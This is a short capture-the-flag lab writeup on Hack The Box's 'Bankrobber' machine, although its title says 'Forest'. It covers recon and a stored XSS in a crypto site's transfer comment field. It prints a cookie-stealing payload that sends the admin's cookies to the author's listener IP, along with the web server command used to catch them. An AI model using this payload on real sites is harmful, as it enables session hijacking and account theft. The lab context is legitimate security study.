# HTB: Forest Writeup w/o Metasploit
![bankrobber](https://user-images.githubusercontent.com/48168337/188629756-091014e6-20cc-4f0c-9540-2a1bb9032dbd.png)

## Introduction
Hey everybody, welcome to this writeup on HTB's Bankrobber box. This machine was pretty challenging and fun at the same time. It was ranked as insane so it may have been more than what most are used to. Anyway, let's jump right into it. 

## Recon
As always, I kicked off a few nmap scans to see what services and ports are available. 

![nmap_scan](https://user-images.githubusercontent.com/48168337/188629985-7a7b8cbf-c5f5-4e10-9ed1-fd0c29c15746.png)

As you can see we have Web services, SMB, and SQL services available. Let's check out the web services first by opening a browser and navigating to http://10.10.10.154. FYI, it'll help to have Burpsuite open and logging all of our web traffic as we're checking out the web services.

![webpage](https://user-images.githubusercontent.com/48168337/188630629-f59738cd-2730-4840-9fa8-35220ac4b373.png)

The webpage brings us to some cryptocurrency platform. After playing around with the web page, I decided to register and create an account called "test" and logged into it. After logging in, you'll notice a "Transfer E-Coin" page; looks like you can transfer cryptocurrency to others using this. The transfer has to be approved by an Admin though. 

![trasnfer_on_hold](https://user-images.githubusercontent.com/48168337/188632981-53acfcf1-a46f-46aa-a361-e18e12758b48.png). 

With that in nind, and the comment section on this page, I thought about a XSS (cross site scripting) attack. 

After some fuzzing around, I noticed you can exploit the comment section with XSS scripts. I tested the XSS vulnerability out with a simple script, after it worked, I created some JavaScript to try and steal cookies. I'll skip my test and get to the cookie stealing script. This (**img src=x onerror=this.src=http://10.10.14.2/?cookie="btoa(document.cookie) />**)is the script I used to steal the admin cookies. How or Why does it steal the admin cookies? Well the script gets executed when the admin approves/denies our transfer. After execution their cookies are forwarded to our server. For this to work, we'll need a webserver stared on our box, I used python (**python3 -m http.server 80**) to start one up. 

![cookie_stealer](https://user-images.githubusercontent.com/48168337/188634014-bdcb655c-f0e4-4099-abcc-e75312ad1d70.png)

